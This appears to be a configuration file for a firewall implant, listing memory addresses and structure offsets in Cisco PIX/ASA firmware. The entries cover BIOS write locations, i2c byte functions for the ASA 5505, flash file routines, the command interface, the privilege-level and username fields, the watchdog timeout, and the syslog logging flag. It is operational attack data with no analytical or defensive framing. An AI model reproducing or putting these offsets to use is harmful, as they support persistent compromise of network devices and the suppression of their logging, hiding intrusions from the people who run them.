; --- SECTION I ---
;
0x10072200            // pix version
0x7e9000              // address of implant configuration
BiosWriteOffset     0x00000020      // offset into the bios structure where write addr is located
FlashMkdirAddress   0x004d5b78      // ifs_mkdir; make flash directory routine -- IFS: Mkdir
ASAFlashRmdirAddress   0x011631e7   // ifs_rmdir; remove flash directory routine for the asa
PIXFlashRmdirAddress   0x0041afc0      // ifs_rmdir; remove flash directory routine for the pix
ASAFlashRmfileAddress  0x01162e5a      // ifs_rmfile; remove flash file routine for the asa
PIXFlashRmfileAddress  0x0041ae40      // ifs_rmfile; remove flash file routine for the pix
FlashDirlistAddress 0x004d53a8      // ifs_get_dir_entry; get the next file name from a directory listing
FlashGetSizeAddress 0x004d4968      // ifs_get_size; get the size of the provided open file
FlashChmodAddress   0x004d56d8      // ifs_chmod; change the permissions on a file
FlashMoveFileAddress 0x004d5808     // ifs_rename; move a file
FlashGetFileInfoAddress 0x004d5dd8  // ifs_get_file_info; returns a structure that contains information about a file, including its size
FlashGetSpaceAddress 0x004d6dd8     // ifs_get_space_info; returns used and free space in flash
FlashFileInfoSizeOffset 0x00000014  // The offset to the file size in the structure returned by ifs_get_file_info
GetPlatformStringAddr 0x01049fd0  // The address of a function that returns the platform string 
ASARestatFlashFlagAddr 0x013dcb20 // The address of the flag that tells the OS on the ASA to re-stat the files in flash (causes used space to be updated)
AnnounceFunc              0x001161f0      // addr of the device announce function
DevIoctlOffset            0x70            // offset to ioctl function in device table
DuartTtyAddr              0x010f4510      // addr of duart/0 tty entry
CIStartFunc               0x0015d680      // addr of the command interface start function -- telnet function
CommandListAddr           0x011be1f0      // addr of the command list -- first parameter of ci
DeviceListPtrAddr         0x012cf9b0      // pointer to the first entry in the device table -- find in announce
DeviceNextPtrOffset       0x50            // offset into the device table entry which has pointer to next entry -- find in announce
StrcmpFuncAddr            0x01055fc0      // address of strcmp -- search for 'strcmp'
SyslogFlagPtrAddr         0x014739f8      // pointer to the logging flag. -- search for 'Syslog logging:'
PGDGETValue               0x85b00002      // The value used for PGD_GET when calling the pager ioctl
PGDPUSHValue              0x85b00003      // The value used for PGD_PUSH when calling the pager ioctl
PGDSETValue               0x85b00000      // The value used for PGD_SET when calling the pager ioctl
StdChOffset               0xb0            // Offset into a thread struct containing the stdch pointer
StdErrOffset              0xb4            // Offset into a thread struct containing the stderr pointer
PrivFlagOffset            0x0c            // offset into an environment struct containing the privilege level indicator
UnameOffset               0x14            // offset into an environment struct containing the username 
EnvPtrOffset              0xbc            // offset into a thread struct containing the pointer to the environment struct  
SyslogOffset              0x00000a38      // offset into the syslog structure where the logging level is stored
Open                      0x00116300      // open
ChannelConfigOffset       0x08            // offset into a channel where the configuration pointer is
InputModeOffset           0x08            // offset into a duart config structure where the input mode is stored
InputModeEsc              0x20            // Input mode used for entering escape sequence
WatchDogTimeout     0x010ccf10      // Address where the thread timeout value is stored 
UpTimeCounter       0x013a8620      // Address of the up time counter
i2cReadByte         0x0105aba0      // read byte function needed to operate on the bios of the asa 5505
i2cWriteByte        0x0105a9f0      // write byte function needed to operate on the bios of the asa 5505
;
; --- END OF SECTION II ---
;
:EOS:
;
